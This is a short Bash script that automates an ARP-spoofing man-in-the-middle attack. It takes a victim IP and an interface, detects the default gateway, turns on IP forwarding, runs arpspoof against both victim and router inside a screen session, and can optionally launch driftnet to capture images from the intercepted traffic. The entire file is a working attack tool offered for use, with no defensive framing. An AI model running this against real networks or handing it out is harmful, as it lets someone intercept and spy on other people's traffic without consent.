#!/usr/bin/env bash

#===============================================================================================
# System required: Linux
# Packages required: arpspoof
# Optional packages: driftnet
# Description: Bundles several man-in-the-middle scripts.
# Author: dsfranzi
#===============================================================================================

RCFILE="/tmp/arpspoofex.rc"

while getopts "hndv:r:i:" opt 
do
	case $opt in
		h)	# Help
			echo "Usage:"
			echo "$0 [options] <-v Victim IP Address>"
			echo ""
			echo "Required Options"
			echo -e "-v <IP Address>\t\tDestination IP Address"
			echo ""
			echo "Options"
			echo -e "-h\t\t\tHelp"
			echo -e "-i <Interface>\t\tInterface"
			echo -e "-n\t\t\tNo Forwarding"
			echo -e "-r <IP Address>\t\tRouter IP Address."
			echo -e "\t\t\tStandard: the default gateway IP address if not set."
			echo ""
			echo -e "-d\t\t\tStart Driftnet"
			exit 1
		;;
		i)	# Interface
			INTERFACE=$OPTARG
		;;
		n)	# No Forwarding
			NOFORWARD=true
		;;
		v)	# Destination
			VICTIM=$OPTARG
		;;
		r)	# Router
			GATEWAY=$OPTARG
		;;
		### Optional Scripts
		d)	# Driftnet
			DRIFTNET=true
		;;
	esac
done

# Requirements
if [ -z "$VICTIM" ]
then
	echo "-v Argument not provided."
	exit 1
elif [ -z "$INTERFACE" ]
then
	echo "-i Argument not provided."
	exit 1
fi

# Router IP Address
if [ -z "$GATEWAY" ] 
then
	GATEWAY=`ip route show | grep default | awk '{print $3}'`
	if [ -z "$GATEWAY" ] 
	then
	 	echo "Router IP Address not found."
		exit 1
	fi
fi

echo "Starting arpspoof..."

if [ "$NOFORWARD" == "true" ]
then
	FORWARD=0
else
	FORWARD=1
fi
echo $FORWARD > /proc/sys/net/ipv4/ip_forward

echo "startup_message off" > $RCFILE
echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
echo -e "screen -t arpspoof arpspoof -i $INTERFACE -r -t $GATEWAY $VICTIM" >> $RCFILE

if [ "$DRIFTNET" == "true" ]
then
	driftnet -i $INTERFACE &
fi

echo -e "screen -r -t Main" >> $RCFILE

screen -c $RCFILE
